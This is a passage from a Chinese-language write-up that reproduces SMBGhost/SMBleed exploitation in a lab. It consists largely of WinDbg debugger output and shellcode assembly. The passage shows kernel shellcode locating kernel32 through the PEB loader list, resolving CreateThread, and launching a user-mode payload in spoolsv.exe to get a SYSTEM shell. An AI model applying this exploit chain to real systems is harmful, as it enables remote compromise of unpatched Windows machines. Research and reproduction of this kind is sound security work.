    fffffe80`766458d0  00000000
    kd> dd fffffe80`766458d0 l1    //baseAddr
    fffffe80`766458d0  00bc0000
    kd> u rip  //将用户模式代码复制到bc0000处：
    fffff780`00000aa5 488b3e          mov     rdi,qword ptr [rsi]
    fffff780`00000aa8 488d354d000000  lea     rsi,[fffff780`00000afc]
    fffff780`00000aaf b980030000      mov     ecx,380h
    fffff780`00000ab4 f3a4            rep movs byte ptr [rdi],byte ptr [rsi]
    kd> u bc0000
    00000000`00bc0000 4892            xchg    rax,rdx
    00000000`00bc0002 31c9            xor     ecx,ecx
    00000000`00bc0004 51              push    rcx
    00000000`00bc0005 51              push    rcx
    00000000`00bc0006 4989c9          mov     r9,rcx
    00000000`00bc0009 4c8d050d000000  lea     r8,[00000000`00bc001d]
    00000000`00bc0010 89ca            mov     edx,ecx
    00000000`00bc0012 4883ec20        sub     rsp,20h
  * 查找kernel32模块  
思路是通过遍历之前找到的”spoolsv.exe”的PEB结构中的Ldr->InMemoryOrderModuleList->Flink，找到kernel32模块（unicode字符串特征比对）。  
PEB偏移0x18为_PEB_LDR_DATA结构的Ldr
，其偏移0x20处为一个_LIST_ENTRY结构的InMemoryOrderModuleList，_LIST_ENTRY结构中包含flink和blink指针，通过遍历flink指针可以查询不同模块的LDR_DATA_TABLE_ENTRY结构。
    1: kd> dt _peb @rax
    nt!_PEB
       +0x000 InheritedAddressSpace : 0 ''
       +0x001 ReadImageFileExecOptions : 0 ''
       +0x002 BeingDebugged    : 0 ''
       +0x003 BitField         : 0x4 ''
       +0x003 ImageUsesLargePages : 0y0
       +0x003 IsProtectedProcess : 0y0
       +0x003 IsImageDynamicallyRelocated : 0y1
       +0x003 SkipPatchingUser32Forwarders : 0y0
       +0x003 IsPackagedProcess : 0y0
       +0x003 IsAppContainer   : 0y0
       +0x003 IsProtectedProcessLight : 0y0
       +0x003 IsLongPathAwareProcess : 0y0
       +0x004 Padding0         : [4]  ""
       +0x008 Mutant           : 0xffffffff`ffffffff Void
       +0x010 ImageBaseAddress : 0x00007ff7`94970000 Void
       +0x018 Ldr              : 0x00007fff`ea7a53c0 _PEB_LDR_DATA
       +0x020 ProcessParameters : 0x00000000`012c1bc0 _RTL_USER_PROCESS_PARAMETERS
       +0x028 SubSystemData    : (null) 
       +0x030 ProcessHeap      : 0x00000000`012c0000 Void
       ......
    1: kd> dx -id 0,0,ffff818c698db380 -r1 ((ntkrnlmp!_PEB_LDR_DATA *)0x7fffea7a53c0)
    ((ntkrnlmp!_PEB_LDR_DATA *)0x7fffea7a53c0)                 : 0x7fffea7a53c0 [Type: _PEB_LDR_DATA *]
        [+0x000] Length           : 0x58 [Type: unsigned long]
        [+0x004] Initialized      : 0x1 [Type: unsigned char]
        [+0x008] SsHandle         : 0x0 [Type: void *]
        [+0x010] InLoadOrderModuleList [Type: _LIST_ENTRY]
        [+0x020] InMemoryOrderModuleList [Type: _LIST_ENTRY]
        [+0x030] InInitializationOrderModuleList [Type: _LIST_ENTRY]
        [+0x040] EntryInProgress  : 0x0 [Type: void *]
        [+0x048] ShutdownInProgress : 0x0 [Type: unsigned char]
        [+0x050] ShutdownThreadId : 0x0 [Type: void *]
    1: kd> dx -id 0,0,ffff818c698db380 -r1 (*((ntkrnlmp!_LIST_ENTRY *)0x7fffea7a53e0))
    (*((ntkrnlmp!_LIST_ENTRY *)0x7fffea7a53e0))                 [Type: _LIST_ENTRY]
        [+0x000] Flink            : 0x12c2580 [Type: _LIST_ENTRY *]
        [+0x008] Blink            : 0x1363920 [Type: _LIST_ENTRY *]
LDR_DATA_TABLE_ENTRY结构偏移0x30处为模块基址，偏移0x58处为BaseDllName，其起始处为模块名的unicode长度（两个字节），偏移0x8处为该模块的unicode字符串。通过长度和字符串这两个特征可以定位kernel32模块，并通过DllBase字段获取基址。在实际操作中需要计算这些地址相对于InMemoryOrderLinks的偏移。
    1: kd> dt _LDR_DATA_TABLE_ENTRY 0x12c2b00
    nt!_LDR_DATA_TABLE_ENTRY
       +0x000 InLoadOrderLinks : _LIST_ENTRY [ 0x00000000`012c30f0 - 0x00000000`012c23e0 ]
       +0x010 InMemoryOrderLinks : _LIST_ENTRY [ 0x00000000`012c3100 - 0x00000000`012c23f0 ]
       +0x020 InInitializationOrderLinks : _LIST_ENTRY [ 0x00000000`012c45b0 - 0x00000000`012c3110 ]
       +0x030 DllBase          : 0x00007fff`e8ab0000 Void
       +0x038 EntryPoint       : 0x00007fff`e8ac7c70 Void
       +0x040 SizeOfImage      : 0xb2000
       +0x048 FullDllName      : _UNICODE_STRING "C:\Windows\System32\KERNEL32.DLL"
       +0x058 BaseDllName      : _UNICODE_STRING "KERNEL32.DLL"
    1: kd> dx -id 0,0,ffff818c698db380 -r1 -nv (*((ntkrnlmp!_UNICODE_STRING *)0x12c2b58))
    (*((ntkrnlmp!_UNICODE_STRING *)0x12c2b58))                 : "KERNEL32.DLL" [Type: _UNICODE_STRING]
        [+0x000] Length           : 0x18 [Type: unsigned short]
        [+0x002] MaximumLength    : 0x1a [Type: unsigned short]
        [+0x008] Buffer           : 0x12c2cb8 : "KERNEL32.DLL" [Type: wchar_t *]
然后在kernel32模块的导出表中寻找CreateThread函数，然后将其保存至KernelApcRoutine函数的参数SystemArgument1中，传送给userland_start_thread。
    ; save CreateThread address to SystemArgument1
    mov [rbx], rax
    kd> dq rbx l1
    fffffe80`766458e0  00000000`00001000
    kd> p
    fffff780`00000aea 31c9            xor     ecx,ecx
    kd> dq fffffe80`766458e0 l1
    fffffe80`766458e0  00007ffa`d229a810
    kd> u 7ffa`d229a810
    KERNEL32!CreateThreadStub:
    00007ffa`d229a810 4c8bdc          mov     r11,rsp
    00007ffa`d229a813 4883ec48        sub     rsp,48h
    00007ffa`d229a817 448b542470      mov     r10d,dword ptr [rsp+70h]
    00007ffa`d229a81c 488b442478      mov     rax,qword ptr [rsp+78h]
    00007ffa`d229a821 4181e204000100  and     r10d,10004h
    00007ffa`d229a828 498943f0        mov     qword ptr [r11-10h],rax
    00007ffa`d229a82c 498363e800      and     qword ptr [r11-18h],0
    00007ffa`d229a831 458953e0        mov     dword ptr [r11-20h],r10d
然后将QUEUEING_KAPC置0，将IRQL 恢复至APC_LEVEL。
    _kernel_kapc_routine_exit:
        xor ecx, ecx
        ; clear queueing kapc flag, allow other hijacked system call to run shellcode
        mov byte [rbp+DATA_QUEUEING_KAPC_OFFSET], cl
        ; restore IRQL to APC_LEVEL
        mov cl, 1
        mov cr8, rcx
###  用户态Shellcode
最终成功运行到用户模式Shellcode，用户模式代码包含userland_start_thread和功能Shellcode（userland_payload），在userland_start_thread中通过调用CreateThread函数去执行功能Shellcode。userland_payload这里不再介绍。
    userland_start_thread:
        ; CreateThread(NULL, 0, &threadstart, NULL, 0, NULL)
        xchg rdx, rax   ; rdx is CreateThread address passed from kernel
        xor ecx, ecx    ; lpThreadAttributes = NULL
        push rcx        ; lpThreadId = NULL
        push rcx        ; dwCreationFlags = 0
        mov r9, rcx     ; lpParameter = NULL
        lea r8, [rel userland_payload]  ; lpStartAddr
        mov edx, ecx    ; dwStackSize = 0
        sub rsp, 0x20
        call rax
        add rsp, 0x30
        ret
    userland_payload:
        "\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52......"
    kd> u r8
    00000000`00bc001d fc              cld
    00000000`00bc001e 4883e4f0        and     rsp,0FFFFFFFFFFFFFFF0h
    00000000`00bc0022 e8c0000000      call    00000000`00bc00e7
    00000000`00bc0027 4151            push    r9
    00000000`00bc0029 4150            push    r8
    00000000`00bc002b 52              push    rdx
    00000000`00bc002c 51              push    rcx
    00000000`00bc002d 56              push    rsi
### **总结~**
本文对公开的关于 SMBGhost 和 SMBleed 漏洞的几种利用思路进行跟进，逆向了一些关键结构和算法特性，最终在实验环境下拿到了System
Shell。非常感谢 blackwhite 和 zcgonvh
两位师傅，在此期间给予的指导和帮助，希望有天能像他们一样优秀。最后放上两种利用思路的复现结果：
## 参考文献
  * 
  * 
  * 
  * 
  * 
  * 
  * 
  * 
  * 
  * 
  * 
  * 